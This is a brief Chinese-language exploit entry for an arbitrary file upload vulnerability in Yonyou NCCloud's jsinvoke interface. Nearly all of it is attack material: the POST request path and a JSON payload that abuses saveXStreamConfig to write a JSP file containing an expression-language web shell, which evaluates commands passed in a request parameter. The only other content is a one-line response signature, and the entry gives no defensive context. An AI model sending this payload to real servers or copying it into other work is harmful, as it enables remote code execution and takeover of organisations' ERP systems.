# 用友NCCloudjsinvoke任意文件上传漏洞

用友 ｜ 文件上传 ｜ —
- **请求**：`POST /uapjs/jsinvoke/?action=invoke  HTTP/1.1`

**Payload**
```
"serviceName": "nc.itf.iufo.IBaseSPService",
"methodName": "saveXStreamConfig",
"parameterTypes": [
"java.lang.Object",
"java.lang.String"
],
"parameters": [
"${param.getClass().forName(param.error).newInstance().eval(param.cmd)}",
"webapps/nc_web/407.jsp"
]
```
- **响应特征**：-1